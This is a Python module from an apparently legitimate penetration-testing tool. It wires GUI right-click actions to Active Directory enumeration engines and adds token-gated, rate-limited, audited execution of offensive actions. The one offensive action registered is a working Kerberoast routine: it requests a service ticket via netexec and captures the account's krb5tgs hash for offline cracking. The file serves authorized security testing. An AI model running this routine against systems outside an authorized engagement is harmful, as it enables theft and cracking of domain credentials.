"""On-demand actions - run a single engine against one target (right-click in the GUI).

Phase 2: **read-only enumeration** actions only. Each action reuses an existing engine
against the clicked node's target and streams results to the live graph via the EventBus,
exactly like a scan does. The plumbing (token-gated POST /action -> here) is the same
channel every future action uses.

Phase 3 (offensive: Kerberoast / secretsdump / pass-the-hash / DCSync / ADCS abuse) will
register here with `offensive=True` and its own confirmation gating - see docs/GUI.md.
Those engines are anjaiv's area; agree each action's params + Finding first.
"""
from __future__ import annotations

import glob
import json
import os
import secrets
import tempfile
import time
from dataclasses import dataclass
from typing import Callable, Optional

from .engines import CertipyEngine, LdapEngine, NetExecEngine, TLSEngine
from .engines.base import Engine, Target
from .engines.ldap import parse_kerberoast
from .events import Event, EventBus, EventKind
from .findings import Category, Evidence, Finding, Report, Severity
from .scan import _emit_finding_graph


@dataclass(frozen=True)
class Action:
    id: str
    label: str
    node_types: tuple[str, ...]          # which graph node types this applies to
    engine: Optional[Callable[[], Engine]] = None   # read-only actions: a fresh engine per run
    offensive: bool = False              # Phase 3: gated, armed channel only
    handler: Optional[Callable[..., list]] = None   # offensive actions: (target, tgt, *, bus, runner) -> [Finding]


# Read-only enumeration actions. `engine` is a factory so each run gets a fresh instance.
ACTIONS: dict[str, Action] = {
    "enum-smb":  Action("enum-smb",  "Enumerate SMB (shares / signing / null)", ("host", "domain"), NetExecEngine),
    "enum-ldap": Action("enum-ldap", "Enumerate LDAP (users / roastable)",      ("host", "domain"), LdapEngine),
    "enum-adcs": Action("enum-adcs", "Enumerate AD CS (ESC)",                    ("host", "domain"), CertipyEngine),
    "enum-tls":  Action("enum-tls",  "Check TLS",                               ("host", "domain"), TLSEngine),
}


def catalog() -> list[dict]:
    """Serializable action list so the GUI can build per-node-type context menus."""
    return [{"id": a.id, "label": a.label, "node_types": list(a.node_types),
             "offensive": a.offensive} for a in ACTIONS.values()]


def actions_for(node_type: str) -> list[Action]:
    return [a for a in ACTIONS.values() if node_type in a.node_types]


def _emit(bus: Optional[EventBus], kind: EventKind, engine: str = "action", **data) -> None:
    if bus is not None:
        bus.publish(Event(kind=kind, data=data, engine=engine))


def run_action(action_id: str, target: str, *, username: Optional[str] = None,
               password: Optional[str] = None, domain: Optional[str] = None,
               bus: Optional[EventBus] = None) -> Report:
    """Run one action against `target`, streaming to `bus`. Returns a Report."""
    report = Report(engagement=f"action:{action_id}", target=target)
    a = ACTIONS.get(action_id)
    if a is None:
        _emit(bus, EventKind.STATUS, message=f"unknown action: {action_id}")
        return report
    if a.offensive or a.engine is None:
        # offensive actions never run through the un-gated read-only path
        _emit(bus, EventKind.STATUS,
              message=f"refused: {action_id} is an offensive action - use the armed channel")
        return report

    eng = a.engine()
    _emit(bus, EventKind.NODE, id=target, label=target, type="host")
    _emit(bus, EventKind.STATUS, engine=eng.name, message=f"{a.label} on {target}")
    _emit(bus, EventKind.PROBE, engine=eng.name, target=target, test=action_id)
    if not eng.is_available():
        _emit(bus, EventKind.STATUS, engine=eng.name, message=f"{eng.name}: not installed - skipping")
        _emit(bus, EventKind.DONE, engine=eng.name)
        return report

    tgt = Target(host=target, username=username, password=password, domain=domain)
    try:
        findings = eng.run(tgt)
    except Exception as e:                # a broken action must not take down the server
        _emit(bus, EventKind.STATUS, engine=eng.name, message=f"{eng.name}: error on {target}: {e}")
        findings = []
    report.findings = findings
    for f in findings:
        _emit_finding_graph(bus, domain or target, target, f)
    _emit(bus, EventKind.STATUS, engine=eng.name, message=f"{a.label}: {len(findings)} finding(s)")
    _emit(bus, EventKind.DONE, engine=eng.name)
    return report


# =========================================================================== #
# Phase 3 - offensive actions: arm/execute gating (docs/GUI.md, issue #49)      #
#                                                                               #
# Offensive actions never run through run_action. The GUI must first ARM the    #
# action (POST /action/arm -> arm_token) then EXECUTE with that token + a typed #
# X-Redness-Confirm header (the web-native equivalent of poison/spray's typed   #
# YES/FORCE, since a POST has no TTY). Arming is rate-limited and every arm /    #
# execute / refusal is audited. This module holds the pure logic; the two       #
# bridge endpoints are Gjoko's live/ follow-up.                                 #
# =========================================================================== #
ARM_TTL = 120.0                  # seconds an arm_token stays valid
ARM_RATE_MAX = 5                 # max arm requests ...
ARM_RATE_WINDOW = 300.0          # ... per this many seconds (5 min); 6th within the window is refused
AUDIT_PATH = os.path.join("loot", "offensive-audit.log")


class ArmError(Exception):
    """Arming refused (unknown/non-offensive action, or rate-limited)."""


@dataclass
class _ArmRecord:
    action: str
    target: str
    expires_at: float            # time.monotonic() deadline
    used: bool = False


_ARM: dict[str, _ArmRecord] = {}
_ARM_TIMES: list[float] = []     # recent arm timestamps, for rate limiting


def _default_audit(rec: dict) -> None:
    try:
        os.makedirs(os.path.dirname(AUDIT_PATH) or ".", exist_ok=True)
        with open(AUDIT_PATH, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")
    except OSError:
        pass


def _audit(sink: Optional[Callable[[dict], None]], event: str, **fields) -> None:
    rec = {"ts": time.time(), "event": event, **fields}
    (sink or _default_audit)(rec)


def arm(action_id: str, target: str, *, now: Optional[float] = None,
        audit: Optional[Callable[[dict], None]] = None) -> dict:
    """Issue a single-use arm_token for an offensive action against `target`.

    Rate-limited (ARM_RATE_MAX per ARM_RATE_WINDOW) and audited. Raises ArmError for a
    non-offensive/unknown action or when rate-limited.
    """
    now = time.monotonic() if now is None else now
    a = ACTIONS.get(action_id)
    if a is None or not a.offensive:
        raise ArmError(f"not an offensive action: {action_id}")
    global _ARM_TIMES
    _ARM_TIMES = [t for t in _ARM_TIMES if now - t < ARM_RATE_WINDOW]
    if len(_ARM_TIMES) >= ARM_RATE_MAX:
        _audit(audit, "arm-refused", action=action_id, target=target, reason="rate-limited")
        raise ArmError("rate limited: too many arm requests")
    _ARM_TIMES.append(now)
    token = secrets.token_urlsafe(24)
    _ARM[token] = _ArmRecord(action=action_id, target=target, expires_at=now + ARM_TTL)
    _audit(audit, "arm", action=action_id, target=target)
    return {"arm_token": token, "expires_in": ARM_TTL, "banner": _arm_banner(a, target)}


def _arm_banner(a: Action, target: str) -> str:
    return (f"OFFENSIVE ACTION: {a.label} against '{target}'. This actively attacks the "
            f"target - authorized, in-scope engagements only. Confirm by sending header "
            f"X-Redness-Confirm: {a.id}")


def _consume_arm(arm_token: str, action_id: str, target: str, confirm: str,
                 *, now: Optional[float] = None) -> bool:
    """True (and consume the single-use token) iff it is valid, unexpired, matches the
    action+target, and `confirm` equals the action id."""
    now = time.monotonic() if now is None else now
    rec = _ARM.get(arm_token)
    if rec is None or rec.used or now > rec.expires_at:
        return False
    if rec.action != action_id or rec.target != target or confirm != action_id:
        return False
    rec.used = True
    return True


def _principal(name: str) -> str:
    """Canonical account key: strip DOMAIN\\ / @domain, lowercase (see docs/DECISIONS BH key)."""
    return name.split("\\")[-1].split("@")[0].lower()


def _default_kerberoast_run(tgt: Target) -> str:
    """Roast via `nxc ldap --kerberoasting`, reusing LdapEngine's invocation + nxc's hash file."""
    eng = LdapEngine()
    if not eng.is_available():
        return ""
    with tempfile.TemporaryDirectory() as td:
        out = os.path.join(td, "tgs.txt")
        raw = eng._invoke(["--kerberoasting", out], tgt)
        for f in glob.glob(os.path.join(td, "*.txt")):
            try:
                with open(f, encoding="utf-8", errors="replace") as fh:
                    raw += "\n" + fh.read()
            except OSError:
                pass
    return raw


def _kerberoast_user(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
                     runner: Optional[Callable[[Target], str]] = None) -> list[Finding]:
    """Kerberoast one principal: request its TGS, keep only that account's krb5tgs hash.

    Reuses ldap.parse_kerberoast; the hash rides in meta["hashes"] for the crack pipeline.
    """
    raw = (runner or _default_kerberoast_run)(tgt)
    pairs = [(a, h) for a, h in parse_kerberoast(raw) if _principal(a) == _principal(target)]
    if not pairs:
        return []
    return [Finding(
        id="kerberoast-user",
        title=f"Kerberoasted {target}",
        severity=Severity.HIGH,
        category=Category.KERBEROS,
        description=f"Requested a service ticket (TGS) for '{target}' and captured its "
                    f"krb5tgs hash for offline cracking.",
        impact="The service account's password hash can be cracked offline; a recovered "
               "password is a valid domain credential.",
        remediation="Use a 25+ character / gMSA service-account password; monitor for "
                    "anomalous TGS requests (many SPNs from one principal).",
        affected=[target],
        evidence=[Evidence(source="netexec-ldap",
                           detail=f"{len(pairs)} krb5tgs hash(es) for {target}")],
        references=["https://attack.mitre.org/techniques/T1558/003/"],
        credentialed=True,
        meta={"offensive": True, "action": "kerberoast-user",
              "hashes": [{"account": a, "hash": h, "type": "krb5tgs"} for a, h in pairs]},
    )]


def execute_armed_action(action_id: str, target: str, tgt: Target, *,
                         arm_token: str, confirm: str, bus: Optional[EventBus] = None,
                         audit: Optional[Callable[[dict], None]] = None,
                         runner: Optional[Callable] = None) -> Report:
    """Run an offensive action, but only against a valid arm_token + confirmation.

    `tgt` carries the connection + credentials (host/domain/username/password/nthash), like
    poison/spray. Findings are marked meta["offensive"]=True. Every path is audited.
    """
    report = Report(engagement=f"action:{action_id}", target=target)
    a = ACTIONS.get(action_id)
    if a is None or not a.offensive or a.handler is None:
        _audit(audit, "refuse", action=action_id, target=target, reason="unknown-or-not-offensive")
        _emit(bus, EventKind.STATUS, message=f"refused: {action_id} is not an offensive action")
        return report
    if not _consume_arm(arm_token, action_id, target, confirm):
        _audit(audit, "refuse", action=action_id, target=target, reason="not-armed-or-bad-confirm")
        _emit(bus, EventKind.STATUS, message=f"refused: {a.label} not armed / bad confirmation")
        return report

    _audit(audit, "execute", action=action_id, target=target, host=tgt.host, user=tgt.username)
    _emit(bus, EventKind.NODE, id=target, label=target, type="user")
    _emit(bus, EventKind.STATUS, message=f"{a.label} on {target} (armed)")
    try:
        findings = a.handler(target, tgt, bus=bus, runner=runner)
    except Exception as e:                # a broken action must not take down the server
        _emit(bus, EventKind.STATUS, message=f"{a.label}: error on {target}: {e}")
        findings = []
    for f in findings:
        f.meta.setdefault("offensive", True)     # marker enforced even if a handler forgets
        f.meta.setdefault("action", action_id)
        _emit_finding_graph(bus, tgt.domain or tgt.host, target, f)
    report.findings = findings
    _audit(audit, "result", action=action_id, target=target, findings=len(findings))
    _emit(bus, EventKind.STATUS, message=f"{a.label}: {len(findings)} finding(s)")
    _emit(bus, EventKind.DONE, engine="action")
    return report


# Register the first offensive action (gated; never in the read-only catalog path).
ACTIONS["kerberoast-user"] = Action(
    "kerberoast-user", "Kerberoast this account", ("user",),
    offensive=True, handler=_kerberoast_user)
